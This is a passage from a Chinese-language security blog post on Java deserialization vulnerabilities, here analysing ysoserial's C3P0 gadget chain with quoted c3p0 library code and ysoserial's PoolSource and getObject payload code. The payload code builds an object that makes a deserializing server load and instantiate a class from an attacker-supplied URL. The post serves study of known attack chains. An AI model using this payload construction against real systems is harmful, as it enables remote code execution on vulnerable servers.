<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext var1;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.env == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.env);</span><br><span class="line">        &#125;</span><br><span class="line">        Context var2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.contextName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var2 = (Context)var1.lookup(<span class="keyword">this</span>.contextName);  <span class="comment">// JNDI 获取对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Reference 获取对象</span></span><br><span class="line">        <span class="keyword">return</span> ReferenceableUtils.referenceToObject(<span class="keyword">this</span>.reference, <span class="keyword">this</span>.name, var2, <span class="keyword">this</span>.env);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) &#123;</span><br><span class="line">            ReferenceIndirector.logger.log(MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + var3.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ReferenceableUtils#referenceToObject 中使用 URLClassLoader 从 URL 中加载了类并实例化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">referenceToObject</span><span class="params">(Reference var0, Name var1, Context var2, Hashtable var3)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String var4 = var0.getFactoryClassName();</span><br><span class="line">        String var11 = var0.getFactoryClassLocation();</span><br><span class="line">        ClassLoader var6 = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var6 = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        Object var7;</span><br><span class="line">        <span class="keyword">if</span> (var11 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var7 = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 URLClassLoader 从 URL 中加载了类并实例化</span></span><br><span class="line">            URL var8 = <span class="keyword">new</span> URL(var11);</span><br><span class="line">            var7 = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;var8&#125;, var6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        Class var12 = Class.forName(var4, <span class="keyword">true</span>, (ClassLoader)var7);</span><br><span class="line">        ObjectFactory var9 = (ObjectFactory)var12.newInstance();</span><br><span class="line">        <span class="keyword">return</span> var9.getObjectInstance(var0, var1, var2, var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isLoggable(MLevel.FINE)) &#123;</span><br><span class="line">            logger.log(MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">        NamingException var5 = <span class="keyword">new</span> NamingException(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">        var5.setRootCause(var10);</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.C3P0#PoolSource 不可序列化的并且实现了 Referenceable 的 ConnectionPoolDataSource 对象，并且其 getReference 方法返回恶意类位置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">&quot;exploit&quot;</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.C3P0#getObject 构造恶意 URL 作为 PoolSource 对象的实例化参数，进一步将 PoolBackedDataSource 对象的 connectionPoolDataSource 指向恶意的 PoolSource。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 url</span></span><br><span class="line">    <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化 PoolBackedDataSource</span></span><br><span class="line">    PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">    Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> PoolSource(className, url));</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201762">JAVA反序列化-ysoserial-URLDNS</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/frohoff/24af7913611f8406eaf3">Security Advisory – Java SE</a></li>
<li><a target="_blank" rel="noopener" href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></li>
<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">java反序列化工具ysoserial分析</a></li>
<li><a target="_blank" rel="noopener" href="http://www.cnblogs.com/tr1ple/p/12421157.html">java反序列化-ysoserial-调试分析总结篇(6)</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1723">Ysoserial Commons-Collections 利用链分析</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1224/">Java 反序列化系列 ysoserial Jdk7u21</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1171/">Java 反序列化系列 ysoserial Groovy 1</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@m01e/ysoserial-groovy1%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-2d53f197efc4">ysoserial Groovy1模块分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/166957.html">Ysoserial Click1利用链分析</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/">Java 反序列化之 CommonsBeanUtils 分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.buaq.net/go-21093.html">ysoserial – Clojure分析</a></li>
<li><a target="_blank" rel="noopener" href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">ROME 反序列化分析</a></li>
<li><a target="_blank" rel="noopener" href="https://su18.org/post/ysuserial/">Java 反序列化取经路</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Jckling</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">https://jckling.github.io/2021/09/16/Security/Java 反序列化漏洞入门/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jckling.github.io" target="_blank">Jckling's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://github.com/frohoff/ysoserial/raw/master/ysoserial.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/jckling/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/jckling/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><div class="ads-wrap"><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1035234274961147" data-ad-slot="3100725659" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/"><img class="prev-cover" src="https://about.twitter.com/content/dam/about-twitter/en/brand-toolkit/brand-banner-desktop.jpg.twimg.1920.jpg" onerror="onerror=null;src='/img/jckling/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python 爬取 twitter 数据</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/"><img class="next-cover" src="https://raw.githubusercontent.com/tagspaces/documentation/master/static/media/v3/tagspaces-v3-themes.jpg" onerror="onerror=null;src='/img/jckling/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">文件标签工具 TagSpaces 使用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/" title="百度 OpenRASP 组成分析"><img class="cover" src="https://avatars.githubusercontent.com/u/31592614?s=200&v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-08</div><div class="title">百度 OpenRASP 组成分析</div></div></a></div><div><a href="/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" title="Gadget Inspector 源码解析"><img class="cover" src="https://i.loli.net/2021/06/14/2NXqsznriG8blc7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-12</div><div class="title">Gadget Inspector 源码解析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/jckling/avatar.jpg" onerror="this.onerror=null;this.src='/img/jckling/avatar_404.png'" alt="avatar"/></div><div class="author-info__name">Jckling</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">107</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jckling"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎访问本站 🥳 <br/>评论需要审核，请不要重复提交~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Java 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.1.</span> <span class="toc-text">demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%86%99-readObject-%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">重写 readObject 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-number">1.1.2.</span> <span class="toc-text">RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CC5%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">RMI 反序列化漏洞（CC5）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-CommonsCollections"><span class="toc-number">1.1.4.</span> <span class="toc-text">Apache CommonsCollections</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ysoserial"><span class="toc-number">2.</span> <span class="toc-text">ysoserial</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">2.1.</span> <span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1"><span class="toc-number">2.2.</span> <span class="toc-text">CC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jdk-1-7u21"><span class="toc-number">2.3.</span> <span class="toc-text">jdk 1.7u21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2"><span class="toc-number">2.4.</span> <span class="toc-text">CC2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3"><span class="toc-number">2.5.</span> <span class="toc-text">CC3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC4"><span class="toc-number">2.6.</span> <span class="toc-text">CC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">2.7.</span> <span class="toc-text">CC5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">2.8.</span> <span class="toc-text">CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">2.9.</span> <span class="toc-text">CC7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy1"><span class="toc-number">2.10.</span> <span class="toc-text">Groovy1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Click1"><span class="toc-number">2.11.</span> <span class="toc-text">Click1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsBeanutils1"><span class="toc-number">2.12.</span> <span class="toc-text">CommonsBeanutils1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Clojure"><span class="toc-number">2.13.</span> <span class="toc-text">Clojure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROME"><span class="toc-number">2.14.</span> <span class="toc-text">ROME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Myfaces1"><span class="toc-number">2.15.</span> <span class="toc-text">Myfaces1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Myfaces2"><span class="toc-number">2.16.</span> <span class="toc-text">Myfaces2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring1"><span class="toc-number">2.17.</span> <span class="toc-text">Spring1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring2"><span class="toc-number">2.18.</span> <span class="toc-text">Spring2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vaddin1"><span class="toc-number">2.19.</span> <span class="toc-text">Vaddin1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0"><span class="toc-number">2.20.</span> <span class="toc-text">C3P0</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E9%98%85"><span class="toc-number">3.</span> <span class="toc-text">参阅</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/" title="Datalog 引擎 Soufflé 指南"><img src="https://i.loli.net/2021/06/14/oSn9dxfYhEHClIe.jpg" onerror="this.onerror=null;this.src='/img/jckling/404.jpg'" alt="Datalog 引擎 Soufflé 指南"/></a><div class="content"><a class="title" href="/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/" title="Datalog 引擎 Soufflé 指南">Datalog 引擎 Soufflé 指南</a><time datetime="2021-11-22T11:01:43.000Z" title="发表于 2021-11-22 19:01:43">2021-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/" title="CVE-2020-12691 漏洞利用相关信息追踪"><img src="https://i.loli.net/2021/06/14/bk5UlhqE4DZJfYu.png" onerror="this.onerror=null;this.src='/img/jckling/404.jpg'" alt="CVE-2020-12691 漏洞利用相关信息追踪"/></a><div class="content"><a class="title" href="/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/" title="CVE-2020-12691 漏洞利用相关信息追踪">CVE-2020-12691 漏洞利用相关信息追踪</a><time datetime="2021-11-05T07:25:15.000Z" title="发表于 2021-11-05 15:25:15">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/" title="LogiQL 入门"><img src="https://developer.logicblox.com/wp-content/uploads/2017/12/prod-bg-panelfour.jpg" onerror="this.onerror=null;this.src='/img/jckling/404.jpg'" alt="LogiQL 入门"/></a><div class="content"><a class="title" href="/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/" title="LogiQL 入门">LogiQL 入门</a><time datetime="2021-10-26T08:15:05.000Z" title="发表于 2021-10-26 16:15:05">2021-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" title="Gadget Inspector 源码解析"><img src="https://i.loli.net/2021/06/14/2NXqsznriG8blc7.jpg" onerror="this.onerror=null;this.src='/img/jckling/404.jpg'" alt="Gadget Inspector 源码解析"/></a><div class="content"><a class="title" href="/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" title="Gadget Inspector 源码解析">Gadget Inspector 源码解析</a><time datetime="2021-10-12T03:41:30.000Z" title="发表于 2021-10-12 11:41:30">2021-10-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/" title="Python 爬取 twitter 数据"><img src="https://about.twitter.com/content/dam/about-twitter/en/brand-toolkit/brand-banner-desktop.jpg.twimg.1920.jpg" onerror="this.onerror=null;this.src='/img/jckling/404.jpg'" alt="Python 爬取 twitter 数据"/></a><div class="content"><a class="title" href="/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/" title="Python 爬取 twitter 数据">Python 爬取 twitter 数据</a><time datetime="2021-10-11T10:44:50.000Z" title="发表于 2021-10-11 18:44:50">2021-10-11</time></div></div></div></div><div class="card-widget ads-wrap"><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1035234274961147" data-ad-slot="8787224657" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div></main><footer id="footer" style="background-image: url('https://github.com/frohoff/ysoserial/raw/master/ysoserial.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Jckling</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadWaline () {
  function initWaline () {
    const waline = new Waline(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://blog-comments-puce.vercel.app',
      avatar: 'retro',
      avatarCDN: 'https://sdn.geekzu.org/avatar/',
      path: location.pathname,
      visitor: false,
      dark: 'html[data-theme="dark"]'
    }, {"emoji":"https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/tw-emoji"}))
  }

  if (typeof Waline === 'function') initWaline() 
  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
}

if ('Waline' === 'Waline' || !false) {
  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>